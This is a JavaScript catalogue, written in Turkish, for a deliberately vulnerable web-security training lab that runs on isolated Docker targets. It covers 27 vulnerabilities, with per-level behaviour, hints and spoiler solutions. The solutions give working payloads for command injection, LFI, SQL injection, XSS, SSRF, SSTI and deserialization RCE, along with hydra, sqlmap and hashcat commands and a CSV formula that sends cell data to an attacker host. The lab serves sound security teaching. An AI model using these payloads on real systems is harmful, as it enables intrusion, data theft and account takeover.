/* ============================================================================
   ördek-lab // Zafiyet kayıt defteri  (yalnızca izole Docker hedef makineleri)
   ----------------------------------------------------------------------------
   Bu uygulamada in-app "demo" ya da "sayfayı yeni sekmede aç" yoktur. Her zafiyet,
   panelden başlatılan izole bir Docker hedef makinesine karşılık gelir — saldırıyı
   o konteynerde, gerçek backend'e karşı yaparsın. Panel yalnızca bir dizin + seviye
   seçimi + makine başlatma + ilerleme + ipucu/çözüm katmanıdır.

   Her kayıt:
     slug     → katalog anahtarı (lib/machines.js ile aynı; flag/story/endpoint oradan gelir)
     levels   → low (sömürülür) / medium (bypass) / high (güvenli) davranışı
     hints    → kademeli ipuçları (spoiler)
     solution → adım adım çözüm + payload (spoiler)
   ============================================================================ */

const GROUPS = [
  { id: "core", label: "Çekirdek Web Zafiyetleri", sub: "Injection & Klasik" },
  { id: "auth", label: "Kimlik Doğrulama & Yetkilendirme", sub: "AuthN / AuthZ" },
  { id: "modern", label: "Modern & Sunucu Tarafı", sub: "Node.js / Mantık" },
];

const VULNS = [
  /* ───────────────────────── ÇEKİRDEK ───────────────────────── */
  {
    id: 1, slug: "brute-force", group: "core", name: "Brute Force / Username Enumeration",
    scenario: "Giriş formu. Hız sınırı ve kullanıcı-adı sızıntısı seviyeye göre değişir.",
    levels: {
      low: "Hız sınırı yok + hata mesajı kullanıcının var olup olmadığını sızdırır ('Parola yanlış' vs 'Böyle bir kullanıcı yok').",
      medium: "Hız sınırı X-Forwarded-For başlığına göre tutulur — başlık sahte olduğu için her istekte değiştirilerek atlatılır.",
      high: "Hesap-bazlı kilitleme (5 başarısızda) + jenerik hata mesajı.",
    },
    hints: ["Bu portalda hedef hesap admin; parola bir sözlük kelimesi (ipucu: kuş).", "Medium'da limit IP başına; X-Forwarded-For her istekte değiştirilebilir."],
    solution: "Hedef /brute. Low: admin / bird ile gir. Hydra ile: hydra -l admin -P rockyou.txt -s 3000 localhost http-post-form '/brute:username=^USER^&password=^PASS^:LOGIN_FAILED'. Medium'da her istekte rastgele X-Forwarded-For gönder, böylece IP limiti sıfırlanır. Flag girişe basınca görünür.",
  },
  {
    id: 2, slug: "command-injection", group: "core", name: "Command Injection",
    scenario: "Ping tanılama aracı; girdi shell'e (`ping -c 2 <host>`) geçirilir.",
    levels: {
      low: "Girdi doğrudan shell'e gider; `; & |` zincirleme operatörleri serbest.",
      medium: "`;` ve `&&` silinir — ama `|` ve `%0a` hâlâ çalışır.",
      high: "Boşluk karakteri reddedilir; yine de `${IFS}` ile atlatma denenebilir.",
    },
    hints: ["Flag konteynerde /tmp/flag.txt içinde.", "Medium boşluk değil, yalnızca ; ve && siler — pipe (|) kalır."],
    solution: "Hedef /cmd. Low: 127.0.0.1; cat /tmp/flag.txt. Medium: 127.0.0.1 | cat /tmp/flag.txt. High: boşluk yasak → cat${IFS}/tmp/flag.txt.",
  },
  {
    id: 3, slug: "csrf", group: "core", name: "CSRF (Token Doğrulama)",
    scenario: "Profil (bio/e-posta) güncelleme. Anti-CSRF token zorunluluğu seviyeye göre değişir.",
    levels: {
      low: "Hiçbir token kontrolü yok — herhangi bir site formu gönderebilir.",
      medium: "Referer/Origin kontrol edilir ama .includes() ile zayıf; no-referrer veya isim hilesiyle atlatılır.",
      high: "Loose-check: token YALNIZCA gönderildiğinde doğrulanır → hiç göndermeyince geçer.",
    },
    hints: ["Dış kaynaklı (Same-Origin olmayan) bir POST başarılı CSRF sayılır.", "High'da formdan csrf_token alanını TAMAMEN çıkar."],
    solution: "Saldırgan sayfasında otomatik gönderilen bir <form action='http://localhost:3000/csrf' method='post'> kur. High'da gizli csrf_token input'unu hiç koyma (undefined → kontrol atlanır). E-posta dış istekle değişince flag çıkar.",
  },
  {
    id: 4, slug: "file-inclusion", group: "core", name: "Path Traversal / LFI",
    scenario: "`?file=` parametresi bir dosyayı okur.",
    levels: {
      low: "Yol doğrulanmaz; mutlak yol veya `../` ile her dosya okunur.",
      medium: "`../` tek geçişte silinir → `....//` ile atlatılır.",
      high: "`../` ile başlayan yollar reddedilir (mutlak yol/encode denenebilir).",
    },
    hints: ["Hedef dosya /etc/passwd; okununca flag eklenir.", "Medium tek geçiş siler: ....// → ../ kalır."],
    solution: "Hedef /lfi?file=../../../../etc/passwd (low). Medium: /lfi?file=....//....//....//....//etc/passwd. /etc/passwd okununca flag içeriğe eklenir.",
  },
  {
    id: 5, slug: "sql-injection", group: "core", name: "SQL Injection (Error-Based + UNION)",
    scenario: "Ürün arama: `SELECT ... FROM products WHERE id=<girdi>`.",
    levels: {
      low: "Girdi sorguya birleştirilir; `'` → hata ifşası, UNION → users tablosu.",
      medium: "`UNION`/`SELECT` (büyük harf) silinir → `UnIoN SeLeCt` ile atlatılır.",
      high: "Parametreli sorgu (Number); enjeksiyon etkisiz.",
    },
    hints: ["users tablosunda 'flag' adlı kullanıcının password alanı flag'i tutar.", "Sütun sayısı 5: id,name,price,stock,description."],
    solution: "Hedef /sqli?id=0 UNION SELECT id,username,password,role,email FROM users-- (low). Medium: /sqli?id=0 UnIoN SeLeCt id,username,password,role,email FROM users-- . 'flag' satırının password alanı = flag. sqlmap: sqlmap -u 'http://localhost:3000/sqli?id=1' --cookie='security_level=low' --dump -T users.",
  },
  {
    id: 6, slug: "sql-injection-blind", group: "core", name: "SQL Injection (Login Bypass)",
    scenario: "Yönetim paneli giriş ekranı; parola alanında SQL enjeksiyonu ile kimlik doğrulamayı atlat.",
    levels: {
      low: "Ham string birleştirme → `' OR '1'='1` ile parola doğrulaması atlanır.",
      medium: "Büyük harf kara liste (OR/AND/UNION/--) → `oR`, `||` gibi varyantlar geçer.",
      high: "Parametreli sorgu (prepared statement); enjeksiyon etkisiz.",
    },
    hints: ["Amaç admin olarak girmek; parolayı bilmiyorsun.", "Medium büyük harf filtreler; küçük/karışık harf dene."],
    solution: "Hedef /sqli-blind. Kullanıcı: admin, Parola: ' OR '1'='1 (low). Medium: ' oR '1'='1 veya '||'1'='1. Dashboard açılınca flag banner görünür.",
  },
  {
    id: 7, slug: "xss-reflected", group: "core", name: "Reflected XSS",
    scenario: "Arama terimi sayfaya temizlenmeden yansıtılır.",
    levels: {
      low: "Çıktı encode edilmez; `<script>` aynen çalışır.",
      medium: "`<script>...</script>` silinir; `onerror`/`onload` kalır.",
      high: "Tehlikeli karakterler encode edilir; payload çalışmaz.",
    },
    hints: ["Sayfada window.showFlag() fonksiyonu hazır; onu çağır.", "Medium script etiketini siler; event handler kullan."],
    solution: "Hedef /xss-ref?q=<script>showFlag()</script> (low). Medium: /xss-ref?q=<svg onload=showFlag()> veya <img src=x onerror=showFlag()>. Payload çalışınca flag banner açılır.",
  },
  {
    id: 8, slug: "xss-stored", group: "core", name: "Stored XSS",
    scenario: "Kullanıcı yorumları kaydedilir ve sayfaya giren herkese yansıtılır.",
    levels: {
      low: "Yorum HTML encode edilmeden saklanır → kalıcı XSS.",
      medium: "Kaydederken `<script>` kelimesi silinir (kara liste); `onerror` kalır.",
      high: "Ekrana basılırken `escapeHTML` ile karakterler güvenli hale getirilir.",
    },
    hints: ["window.showFlag() yine hazır.", "Medium yalnızca <script> bloğunu siler."],
    solution: "Hedef /xss-stored yorum kutusu: <script>showFlag()</script> (low). Medium: <img src=x onerror=showFlag()>. Yorum kaydedilince ve sayfa her açıldığında tetiklenir.",
  },

  /* ───────────────────────── KİMLİK & YETKİ ───────────────────────── */
  {
    id: 9, slug: "insecure-jwt", group: "auth", name: "Insecure JWT",
    scenario: "Token doğrulama. `alg:none` ve zayıf secret seviyeye göre kabul edilir.",
    levels: {
      low: "`alg:none` imzasız token kabul edilir → rol sahteleme.",
      medium: "Zayıf secret `secret123` ile imzalı token kabul (hashcat ile kırılır).",
      high: "Güçlü secret + algorithms:['HS256']; zayıf token reddedilir.",
    },
    hints: ["Sayfadaki 'alg:none üret' düğmesi role=admin payload üretir.", "Medium secret123 ile yeniden imzala."],
    solution: "Hedef /jwt. Low: 'alg:none üret (admin)' → 'Token ile Giriş Yap'. Medium: token'ı secret123 ile imzala (hashcat -m 16500 token.txt rockyou.txt ile secret'ı doğrula), role=admin yap. Admin doğrulanınca flag banner.",
  },
  {
    id: 10, slug: "cors-misconfig", group: "auth", name: "CORS Misconfiguration",
    scenario: "Hassas profil API'si; Access-Control-Allow-Origin seviyeye göre.",
    levels: {
      low: "Gelen `Origin` aynen yansıtılır + credentials:true → her site okur.",
      medium: "`origin.endsWith('ordek-store.com')` → `evilordek-store.com` ile atlatılır.",
      high: "Tam eşleşme `https://ordek-store.com`; başkası reddedilir.",
    },
    hints: ["Bu lab'da Origin, X-Fake-Origin kutusundan iletilir.", "Medium endsWith kontrolü → öncesine ek koy."],
    solution: "Hedef /cors → 'sahte Origin' kutusuna https://evil.com yaz (low) ya da https://evilordek-store.com (medium) → 'API'ye İstek At'. Dönen JSON içinde flag.",
  },
  {
    id: 11, slug: "mass-assignment", group: "auth", name: "Mass Assignment",
    scenario: "Profil güncellemede sunucu gövdedeki tüm alanları doğrudan yazar; gizli `role`/`isAdmin`'i manipüle et.",
    levels: {
      low: "Tüm alanlar doğrudan kaydedilir (örn. `role: admin`).",
      medium: "`role` filtrelenir ama `isAdmin: true` göndererek atlatılır.",
      high: "Sadece beyaz listedeki alanlar (email, bio) güncellenir.",
    },
    hints: ["Form yalnızca email/bio gönderir; gövdeye gizli alan ekle.", "Medium role'ü siler ama isAdmin'i unutur."],
    solution: "Hedef /mass. Burp/fetch ile gövdeye fazladan alan ekle: low → {\"email\":\"x\",\"role\":\"admin\"}; medium → {\"email\":\"x\",\"isAdmin\":true}. Canlı DB görüntüsünde role=admin / isAdmin=true görününce flag banner.",
  },
  {
    id: 12, slug: "idor-bola", group: "auth", name: "IDOR / BOLA",
    scenario: "Sipariş sayfasında `/idor?orderId=1002` ile faturana erişirsin; ID'yi değiştirip başkalarınınkini oku.",
    levels: {
      low: "Sahiplik kontrolü yok. `orderId=1001` ile adminin siparişini oku.",
      medium: "ID artık UUID; sahiplik yine kontrol edilmez — UUID sızarsa okunur.",
      high: "`WHERE id=orderId AND owner_id=session` ile kesin sahiplik; başkasınınki 404/403.",
    },
    hints: ["Senin siparişin 1002; admin'inki bir öncesi.", "Medium UUID: order-a1b2c3d4-super-secret-admin."],
    solution: "Hedef /idor?orderId=1001 (low). Medium: /idor?orderId=order-a1b2c3d4-super-secret-admin. Admin faturasının NOT alanında flag.",
  },
  {
    id: 13, slug: "mfa-bypass", group: "auth", name: "2FA / MFA Bypass",
    scenario: "Parola doğru; sisteme girmek için 4 haneli MFA kodunu atlatman gerekiyor.",
    levels: {
      low: "OTP kodu, gönderildikten sonra Console ve ağ (Network) yanıtında sızdırılır.",
      medium: "Sızıntı yok ama state denetimi eksik → `?page=dashboard` ile MFA aşaması atlanır.",
      high: "Token sunucuda; MFA doğrulanmadan dashboard erişimi reddedilir.",
    },
    hints: ["Giriş admin@ordek.com / password.", "Low: F12 Console; Medium: URL'de ?page=otp'yi ?page=dashboard yap."],
    solution: "Hedef /mfa-router → giriş yap. Low: F12 → Console'daki [DEBUG] MFA Token kodunu OTP ekranına gir (veya Network'te login yanıtındaki token). Medium: adres çubuğunda ?page=otp yerine ?page=dashboard yaz. Dashboard açılınca flag banner.",
  },
  {
    id: 14, slug: "insecure-randomness", group: "auth", name: "Insecure Randomness",
    scenario: "Parola sıfırlamada tahmin edilebilir (zayıf) token üretimi.",
    levels: {
      low: "Token ardışık/global sayaç → bir sonraki token tahmin edilir.",
      medium: "Token zaman damgası tabanlı → zaman farkıyla hedefin token'ı tahmin edilir.",
      high: "`crypto.randomBytes` → kriptografik, tahmin edilemez.",
    },
    hints: ["Kendine (hacker@ordek.com) kod isteyip Giden Kutusu'ndan oku.", "Low: token ardışık sayı; admin'inki seninkinden hemen sonraki."],
    solution: "Hedef /insecure-router. 1) Sıfırla'da hacker@ordek.com'a kod iste, Giden Kutusu'ndan değeri oku (örn 1042). 2) Hemen admin@ordek.com'a kod iste (1043 olur). 3) Doğrula'da admin@ordek.com + tahmin edilen token + yeni parola gir → başarı sayfasında flag.",
  },

  /* ───────────────────────── MODERN & SUNUCU ───────────────────────── */
  {
    id: 15, slug: "ssrf", group: "modern", name: "SSRF (İç Servis & Metadata)",
    scenario: "URL'den önizleme getirir; sunucu keyfi adrese istek atar.",
    levels: {
      low: "Her URL fetch edilir → iç servise (localhost:8080/admin) ve metadata'ya erişim.",
      medium: "`127.0.0.1`/`localhost`/`169.254.169.254` kara listede — varyasyonla atlatılır.",
      high: "Yalnızca `http://api.ordek-store.com` ile başlayan URL (startsWith bypass: @127.0.0.1).",
    },
    hints: ["İç admin paneli http://localhost:8080/admin.", "Medium düz string blacklist; 127.0.0.1.nip.io veya decimal IP dene."],
    solution: "Hedef /ssrf-router → URL: http://localhost:8080/admin (low). Medium bypass: http://127.0.0.1.nip.io:8080/admin veya http://2130706433:8080/admin. High bypass: http://api.ordek-store.com@127.0.0.1:8080/admin. Dönen JSON'da flag.",
  },
  {
    id: 16, slug: "prototype-pollution", group: "modern", name: "Prototype Pollution",
    scenario: "Ayar nesnesi kullanıcı gövdesiyle derin birleştirilir (merge).",
    levels: {
      low: "Ham merge → `__proto__` ile Object.prototype kirletilir.",
      medium: "Yalnızca `__proto__` reddedilir → `constructor.prototype` ile atlatılır.",
      high: "`__proto__` ve `constructor` reddedilir; kirlenme olmaz.",
    },
    hints: ["Hedef: yeni objelerde isAdmin=true görünmesi.", "Medium __proto__'yu engeller; constructor.prototype zincirini dene."],
    solution: "Hedef /prototype-router JSON: {\"__proto__\":{\"isAdmin\":true}} (low). Medium: {\"constructor\":{\"prototype\":{\"isAdmin\":true}}}. Yanıtta flag alanı döner.",
  },
  {
    id: 17, slug: "server-side-pp-gadget", group: "modern", name: "Server-Side PP → Gadget",
    scenario: "Kirlenen prototype, sonradan oluşturulan 'spawn opsiyonları'na sızar (NODE_OPTIONS gadget).",
    levels: {
      low: "`__proto__.env.NODE_OPTIONS` set edilir → gadget miras alınır (RCE zinciri).",
      medium: "`__proto__` reddedilir → `constructor.prototype` ile gadget yine set edilir.",
      high: "Güvenli (Object.create(null)); gadget oluşmaz.",
    },
    hints: ["İki adım: önce kirlet, sonra gadget'ı tetikle.", "env.NODE_OPTIONS '--require' içermeli."],
    solution: "Hedef /pp-gadget. 1) JSON ile kirlet: {\"__proto__\":{\"env\":{\"NODE_OPTIONS\":\"--require /tmp/evil.js\"}}} (low) / constructor.prototype varyantı (medium). 2) 'Sistem Durumunu Getir' ile tetikle → çıktıda RCE + flag.",
  },
  {
    id: 18, slug: "ssti", group: "modern", name: "SSTI (EJS Template Injection)",
    scenario: "Kullanıcı şablonu backend'de EJS ile render edilir.",
    levels: {
      low: "`ejs.render(girdi)` → `<%= 7*7 %>`=49, RCE ile `id` çalışır.",
      medium: "`process|require|child_process` silinir; `7*7` çalışır ama RCE kırılır.",
      high: "Şablon sabit; girdi yalnızca veri olarak bağlanır (data-binding).",
    },
    hints: ["Önce <%= 7*7 %> ile SSTI'yi doğrula (49).", "Render context'inde 'flag' değişkeni var: <%= flag %>."],
    solution: "Hedef /ssti biyografi: <%= 7*7 %> (doğrula) → <%= flag %> (flag'i oku) veya <%= global.process.mainModule.require('child_process').execSync('id') %> (RCE, low). Medium: process/require filtreli → global['pro'+'cess'] gibi concat dene.",
  },
  {
    id: 19, slug: "insecure-deserialization", group: "modern", name: "Insecure Deserialization",
    scenario: "Sepet/oturum içe aktarımı; serialize edilmiş veri node-serialize ile geri yüklenir.",
    levels: {
      low: "`node-serialize.unserialize` → IIFE payload ile RCE.",
      medium: "`_$$ND_FUNC$$_`/`child_process`/`exec` imzaları filtrelenir (WAF).",
      high: "Yalnızca `JSON.parse`; fonksiyon asla deserialize edilmez.",
    },
    hints: ["Girdi base64; içine cmd_output döndüren bir IIFE koy.", "node-serialize fonksiyonları _$$ND_FUNC$$_ ile işaretler."],
    solution: "Şu JSON'u base64'le ve /insecure-deserialization kutusuna yapıştır: {\"cmd_output\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"}. cmd_output dolunca yanıtta flag.",
  },
  {
    id: 20, slug: "open-redirect", group: "modern", name: "Open Redirect",
    scenario: "Giriş sonrası `?redirect=` yönlendirmesi.",
    levels: {
      low: "`redirect` doğrudan kullanılır → `http://evil.com`.",
      medium: "URL `ordek-store.com` içermeli → `//evil.com/ordek-store.com` ile atlatılır.",
      high: "URL parse + host allowlist (localhost/ordek-store.com).",
    },
    hints: ["Yönlendirme URL'i dış bir host olmalı.", "Medium yalnızca metinde 'ordek-store.com' arar."],
    solution: "Hedef /open-redirect → 'Yönlendirilecek URL' alanına http://evil.com (low) veya //evil.com/ordek-store.com (medium) yaz → Giriş Yap. Dış yönlendirme onaylanınca flag banner.",
  },
  {
    id: 21, slug: "host-header-poisoning", group: "modern", name: "Host Header Poisoning",
    scenario: "Parola sıfırlama linki Host/X-Forwarded-Host başlığından kurulur.",
    levels: {
      low: "Link `Host` başlığından → zehirlenir.",
      medium: "Host `localhost`/`ordek-store.com` içermeli; `localhost:@evil.com` ile atlatılır.",
      high: "Link sabit `DOMAIN` env'inden; gelen başlıklar yok sayılır.",
    },
    hints: ["Tarayıcıdan Host setlenemez; curl/Burp gerekli.", "Medium 'evil.com' geçen Host'u zehirlenmiş sayar."],
    solution: "curl -H 'Host: evil.com' -H 'content-type: application/json' -H 'x-security-level: low' -d '{\"email\":\"a@b.c\"}' http://localhost:3000/host-header. Medium: Host: localhost:@evil.com. Yanıttaki e-posta linkinde evil.com görününce flag.",
  },
  {
    id: 22, slug: "race-condition", group: "modern", name: "Race Condition (TOCTOU)",
    scenario: "Tek kullanımlık `WELCOME100` kuponu; eşzamanlı isteklerle çok kez kullanılır.",
    levels: {
      low: "Oku-bekle-yaz penceresi (500ms) → eşzamanlı isteklerle çoğu uygulanır.",
      medium: "Pencere küçük (5ms); Turbo Intruder ile yine yarış mümkün.",
      high: "Önce kilitle-sonra işle (atomik) → yalnızca 1 uygulanır.",
    },
    hints: ["Bakiyeyi 100₺ üzerine çıkarman gerekir.", "Tek kupon, çok eşzamanlı POST."],
    solution: "Hedef /race-condition → WELCOME100 kuponuna 10+ eşzamanlı POST gönder (Burp Turbo Intruder ya da: for i in $(seq 20); do curl -s -XPOST localhost:3000/race-condition -H 'content-type: application/json' -d '{\"coupon\":\"WELCOME100\"}' & done). Bakiye 100'ü aşınca flag.",
  },
  {
    id: 23, slug: "business-logic", group: "modern", name: "Business Logic (Fiyat Manipülasyonu)",
    scenario: "Ödeme; fiyat/adet istemciden alınır.",
    levels: {
      low: "Gövdedeki `totalPrice` doğrudan kabul → istediğin tutarı öde.",
      medium: "Fiyat sunucudan; ama `qty` işareti kontrol edilmez (negatif iade).",
      high: "Fiyat sunucudan + negatif/geçersiz `qty` reddedilir.",
    },
    hints: ["100₺ bütçeyle Peluş Ördek (250₺) al.", "Medium negatif adetle toplamı düşür."],
    solution: "Hedef /business-logic. Low: Burp ile isteğin totalPrice değerini 1 yap. Medium: Peluş Ördek qty=1 (250₺) + Ördek Kupa qty=-2 (-160₺) = 90₺. Çekilen tutar ≤100 olunca flag.",
  },
  {
    id: 24, slug: "redos", group: "modern", name: "ReDoS (Catastrophic Backtracking)",
    scenario: "Doğrulama regex'i `^(([a-zA-Z0-9])+)+$`; tek istekle yanıt süresi patlar.",
    levels: {
      low: "Katastrofik regex; uzun `a` dizisi + uymayan karakter saniyelerce sürer.",
      medium: "Uzunluk 50 ile sınırlı ama desen hâlâ üstel.",
      high: "Lineer `^[a-z0-9]+$` + uzunluk limiti; hızlı biter.",
    },
    hints: ["Sonu eşleşmeyen uzun bir girdi ver.", "40+ karakter 'a' + sonda '!' yeterli."],
    solution: "Hedef /redos kullanıcı adı: 45 adet 'a' + '!' (aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!). Yanıt 5sn'yi aşınca flag gösterilir.",
  },
  {
    id: 25, slug: "clickjacking", group: "core", name: "Clickjacking (UI Redress)",
    scenario: "Hassas admin işlemi sayfası iframe korumasından yoksun; şeffaf iframe ile tıklama hırsızlığı.",
    levels: {
      low: "Hiç frame koruması yok → sayfa iframe'e gömülür (UI redress mümkün).",
      medium: "`X-Frame-Options: ALLOW-FROM` (modern tarayıcılarca yok sayılır) → koruma etkisiz.",
      high: "`frame-ancestors 'none'` + `X-Frame-Options: DENY` → çerçeveleme engellenir.",
    },
    hints: ["Hedef sayfa kendini saldırgan iframe'inde göstermeye çalışır.", "Low/Medium'da iframe yüklenir; High'da tarayıcı reddeder."],
    solution: "Hedef /clickjacking'i aç. Low/Medium: hassas panel şeffaf iframe içinde yüklenir → 'framing başarılı' flag banner çıkar. High'da CSP frame-ancestors 'none' iframe'i bloklar ve flag çıkmaz. (Gerçek PoC: kendi sitende <iframe src=http://localhost:3000/clickjacking?action=panel> + decoy.)",
  },
  {
    id: 26, slug: "file-upload", group: "core", name: "File Upload (Webshell)",
    scenario: "Profil fotoğrafı yükleme; uzantı/MIME doğrulaması seviyeye göre.",
    levels: {
      low: "Her uzantı kabul edilir → `.js`/`.php` webshell yüklenir ve servis edilir.",
      medium: "İstemci-tarafı/MIME (declared Content-Type) kontrolü → değer değiştirilerek atlatılır.",
      high: "Magic-byte kontrolü (yalnız PNG/JPEG) + UUID isim → çalıştırılabilir dosya reddedilir.",
    },
    hints: ["Resim yerine shell.js yükle.", "Medium'da 'Content-Type' alanını image/png yap ama dosya .js olsun."],
    solution: "Hedef /upload. Low: shell.js (içeriği herhangi) yükle → webshell kaydedilir, flag çıkar. Medium: declared Content-Type alanına image/png yaz ama .js dosyası seç (MIME bypass). High: yalnız gerçek PNG/JPEG geçer.",
  },
  {
    id: 27, slug: "csv-injection", group: "modern", name: "CSV / Formula Injection",
    scenario: "Kullanıcı adları admin tarafından CSV'ye aktarılır; hücre formül olarak yorumlanabilir.",
    levels: {
      low: "Hücre `=`,`+`,`-`,`@` ile başlasa da kaçırılmaz → Excel'de formül çalışır.",
      medium: "Sadece `=` nötrlenir; `+`,`@`,`-` ile atlatılır.",
      high: "Tehlikeli ön ekler `'` ile escape edilir.",
    },
    hints: ["İsim alanına = ile başlayan bir formül gir.", "Medium yalnız ='i nötrler; @ veya + dene."],
    solution: "Hedef /csv-injection. İsim olarak =HYPERLINK(\"http://atk/?d=\"&A1) (low) ya da @SUM(1+1)*cmd (medium, @ ile başla) ekle, 'CSV indir'e bak: hücre kaçırılmamışsa flag çıkar. High'da ' ön eki ile nötrlenir.",
  },
];

// Zafiyetleri zincirleyen örnek saldırı senaryoları (İlerleme ekranı)
const KILLCHAINS = [
  {
    id: "A", title: "Zincir A — İç Ağ Keşfi & RCE",
    steps: ["ssrf", "command-injection", "ssti"],
    note: "SSRF ile iç servis/metadata flag'lerini topla → Command Injection / SSTI ile uygulama sunucusunda kod çalıştır.",
  },
  {
    id: "B", title: "Zincir B — Hesap Devralma",
    steps: ["brute-force", "insecure-jwt", "idor-bola"],
    note: "Brute force + enum ile geçerli kullanıcı bul → zayıf JWT'yi forge edip admin ol → IDOR ile diğer kullanıcıların siparişlerini gez.",
  },
  {
    id: "C", title: "Zincir C — Veri Sızıntısı",
    steps: ["sql-injection", "file-inclusion", "mfa-bypass"],
    note: "SQLi ile admin parola hash'ini çek (rockyou+hashcat) → LFI ile sunucu dosyalarını oku → MFA bypass ile 2. faktörü atla.",
  },
];

export { GROUPS, VULNS, KILLCHAINS };
